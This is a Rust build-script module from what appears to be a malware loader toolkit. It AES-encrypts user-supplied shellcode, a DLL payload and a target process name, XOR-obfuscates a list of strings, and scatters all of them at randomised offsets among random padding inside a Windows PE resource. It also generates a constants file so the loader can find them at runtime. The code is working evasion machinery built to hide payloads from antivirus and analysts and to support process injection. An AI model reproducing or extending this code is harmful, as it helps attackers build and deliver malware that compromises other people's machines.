use crate::build_src::build_config::{
    DLL_PATH, PAD_RANGE, RESOURCE_ID, RESOURCE_NAME, SHELLCODE_PATH, TARGET_PROCESS, USER_STRINGS,
};
use crate::build_src::build_util::{
    aes_encrypt_bytes, generate_random_bytes, get_iv_len, get_key_len, xor_encrypt_bytes,
};
use crate::build_src::required::STRINGS;
use rand;
use rand::seq::SliceRandom;
use rand::Rng;
use std::{env, fs};
use winresource::WindowsResource;

type BuildFn = fn(&mut ResourceGenerator, &mut Vec<u8>);

struct XORString {
    string_name: &'static str,
    encrypted_string: Vec<u8>,
    offset: usize,
    key_bytes: Vec<u8>,
    key_offset: usize,
}

impl XORString {
    fn new(string_name: &'static str, key_bytes: Vec<u8>) -> Self {
        XORString {
            string_name,
            encrypted_string: xor_encrypt_bytes(
                string_name.to_lowercase().as_bytes(),
                &key_bytes[..],
            ),
            offset: 0,
            key_bytes,
            key_offset: 0,
        }
    }
}

pub(crate) struct ResourceGenerator {
    out_dir: String,
    aes_key_bytes: Vec<u8>,
    aes_key_offset: usize,
    aes_iv_bytes: Vec<u8>,
    aes_iv_offset: usize,
    target_bytes: Vec<u8>,
    target_offset: usize,
    shellcode_bytes: Vec<u8>,
    shellcode_offset: usize,
    dll_bytes: Vec<u8>,
    dll_offset: usize,
    strings: Vec<XORString>,
}

impl ResourceGenerator {
    pub(crate) fn new(out_dir: String) -> Self {
        let aes_iv_bytes = generate_random_bytes(get_iv_len());
        let aes_key_bytes = generate_random_bytes(get_key_len());

        let target_bytes = if !TARGET_PROCESS.is_empty() {
            aes_encrypt_bytes(TARGET_PROCESS.as_bytes(), &aes_key_bytes, &aes_iv_bytes)
        } else {
            vec![]
        };

        let shellcode_bytes = if !SHELLCODE_PATH.is_empty() {
            aes_encrypt_bytes(
                fs::read(SHELLCODE_PATH)
                    .expect("Could not read shellcode from disk.")
                    .as_slice(),
                &aes_key_bytes,
                &aes_iv_bytes,
            )
        } else {
            vec![]
        };

        let dll_bytes = if !DLL_PATH.is_empty() {
            aes_encrypt_bytes(
                fs::read(DLL_PATH)
                    .expect("Could not read dll payload from disk.")
                    .as_slice(),
                &aes_key_bytes,
                &aes_iv_bytes,
            )
        } else {
            vec![]
        };

        let strings = STRINGS
            .iter()
            .map(|string_name| XORString::new(string_name, generate_random_bytes(string_name.len())))
            .chain(USER_STRINGS.iter().map(|string_name| {
                XORString::new(string_name, generate_random_bytes(string_name.len()))
            }))
            .collect();

        ResourceGenerator {
            out_dir,
            aes_key_bytes,
            aes_key_offset: usize::MAX,
            aes_iv_bytes,
            aes_iv_offset: usize::MAX,
            target_bytes,
            target_offset: usize::MAX,
            shellcode_bytes,
            shellcode_offset: usize::MAX,
            dll_bytes,
            dll_offset: usize::MAX,
            strings,
        }
    }

    fn add_target_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
        payload.extend(bytes);

        self.target_offset = payload.len();
        payload.extend(&self.target_bytes);
    }

    fn add_string_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
        payload.extend(bytes);

        let mut string = self.strings.pop().expect("No string info to pop!");
        string.offset = payload.len();
        payload.extend(&string.encrypted_string);

        //put the key in after, simplest solution.
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
        payload.extend(bytes);

        string.key_offset = payload.len();
        payload.extend(&string.key_bytes);

        // We put the xor_strings back into the vector so we can write down the offsets, later.
        self.strings.insert(0, string);
    }

    fn add_aes_key_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
        payload.extend(bytes);

        self.aes_key_offset = payload.len();
        payload.extend(&self.aes_key_bytes);
    }

    fn add_aes_iv_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
        payload.extend(bytes);

        self.aes_iv_offset = payload.len();
        payload.extend(&self.aes_iv_bytes);
    }

    fn add_shellcode_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
        payload.extend(bytes);

        self.shellcode_offset = payload.len();
        payload.extend(&self.shellcode_bytes);
    }

    fn add_dll_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
        payload.extend(bytes);

        self.dll_offset = payload.len();
        payload.extend(&self.dll_bytes);
    }

    pub(crate) fn build_resource_file(&mut self) -> &mut Self {
        // Put these functions into a vector we can then pop functions out of, to randomize position of resources.
        let mut functions: Vec<BuildFn> = vec![
            ResourceGenerator::add_aes_key_to_payload,
            ResourceGenerator::add_aes_iv_to_payload,
            ResourceGenerator::add_shellcode_to_payload,
            ResourceGenerator::add_dll_to_payload,
            ResourceGenerator::add_target_to_payload,
        ];

        functions.resize(
            functions.len() + self.strings.len(),
            ResourceGenerator::add_string_to_payload,
        );

        // Randomize the position of strings and order resources are added to the final resource.
        self.strings.shuffle(&mut rand::thread_rng());
        functions.shuffle(&mut rand::thread_rng());

        // Make a new Vec<u8> and start adding to it.
        let mut resource = vec![];
        for function in functions {
            function(self, &mut resource)
        }

        let end_pad = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
        resource.extend(end_pad);

        fs::write(format!("{}/{}", self.out_dir, RESOURCE_NAME), resource)
            .expect("Could not write payload file.");

        self
    }

    pub(crate) fn build_consts_file(&self) -> &Self {
        let mut consts = vec!["#![allow(unused)]".to_string()];

        consts.push(format!(
            "pub const {}: u32 = {:#X};",
            "RESOURCE_ID", RESOURCE_ID
        ));

        consts.push(format!("pub const {}: usize = {:#X};", "RT_RCDATA", 10));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_KEY_POS", self.aes_key_offset
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_KEY_LEN",
            self.aes_key_bytes.len()
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_IV_POS", self.aes_iv_offset
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_IV_LEN",
            self.aes_iv_bytes.len()
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "TARGET_POS", self.target_offset
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "TARGET_LEN",
            self.target_bytes.len()
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "SHELLCODE_POS", self.shellcode_offset
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "SHELLCODE_LEN",
            self.shellcode_bytes.len()
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "DLL_POS", self.dll_offset
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "DLL_LEN",
            self.dll_bytes.len()
        ));

        self.strings.iter().for_each(|string| {
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_POS",
                string.offset
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_LEN",
                string.encrypted_string.len()
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_KEY",
                string.key_offset
            ));
        });

        fs::write("src/consts.rs", consts.join("\n")).expect("Could not write consts file.");

        self
    }

    pub(crate) fn build_resource_headers(&self) -> &Self {
        fs::write(
            format!("{}/resources.h", self.out_dir),
            format!("#define PAYLOAD_ID {}\n", RESOURCE_ID),
        )
        .expect("Could not write resources.h file.");

        fs::write(
            format!("{}/resources.rc", self.out_dir),
            format!(
                "#include \"resources.h\"\nPAYLOAD_ID RCDATA {}\n",
                RESOURCE_NAME
            ),
        )
        .expect("Could not write resources.rc file.");

        self
    }

    pub(crate) fn build(&self) {
        if env::var("CARGO_CFG_TARGET_OS").unwrap() == "windows" {
            WindowsResource::new()
                .set_resource_file(&format!("{}/resources.rc", self.out_dir))
                .compile()
                .expect("Could not compile pe resource.");
        }
    }
}
